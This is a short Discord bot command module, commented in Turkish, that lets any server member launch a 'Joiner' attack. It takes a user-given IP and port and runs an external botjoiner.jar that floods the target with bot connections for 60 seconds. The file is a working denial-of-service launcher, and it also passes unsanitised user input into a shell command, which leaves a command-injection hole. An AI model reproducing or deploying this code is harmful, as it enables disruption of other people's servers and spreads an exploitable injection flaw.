const Discord = require("discord.js");
const moment = require('moment');

exports.run = async (client, message, args) => {
const host = args.join(" ").split(":").slice(0,1)
const port = message.content.split (":")[1]
var exec = require('child_process').exec
exec(`cmd /c java -jar botjoiner.jar ${host} ${port} 6000 60`, (error, stdout, stderr) => {
});
console.log('Bir Saldırı Başlatıldı Discord ID:' +  message.guild.id)
message.channel.send(`**Joiner** Saldırısı Başlatıldı, Ip Adresi **${host}** Port **${port}** Süre **60 Saniye** <a:ates:760221854957830174>`)
}



exports.conf = {
  enabled: true,
  guildOnly: false,
  aliases: ['Joiner', 'JOINER'],
  permLevel: 0
}

exports.help = {
  name: 'joiner',
  description: 'Özel',
  usage: 'nullping'
}